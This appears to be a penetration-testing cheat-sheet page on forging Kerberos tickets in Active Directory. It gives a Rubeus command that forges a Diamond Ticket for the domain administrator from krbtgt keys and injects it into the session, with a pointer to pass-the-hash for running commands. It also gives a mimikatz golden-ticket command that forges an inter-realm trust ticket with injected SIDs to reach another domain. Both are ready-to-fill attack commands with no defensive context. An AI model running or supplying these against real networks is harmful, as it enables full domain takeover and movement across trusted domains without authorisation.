# Ticket Forging

### Diamon ticket forging

Use Rubeus and the krbtgt credentials to create a Diamond Ticket

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\Rubeus.exe diamond /krbkey:<krbtgt aes256> /tgtdeleg /enctype:aes /ticketuser:administrator /domain:<DOMAIN> /dc:<DC DOMAIN> /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

and now you can [pass-the-hash.md](../active-directory/lateral-movement/pass-the/pass-the-hash.md "mention") to execute commands

### Inter-Realm Ticket

{% code overflow="wrap" %}
```powershell
kerberos::golden /user:Administrator /domain:<CURRENT DOMAIN> /sid:<CURRENT DOMAIN SID> /sids:<SID TO EXTRACT> /rc4:<TRUST KEY> /service:krbtgt /target:<TARGET DOMAIN> /ticket:./trust_tkt.kirbi" 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Pasted image 20231113155053.png" alt=""><figcaption></figcaption></figure>
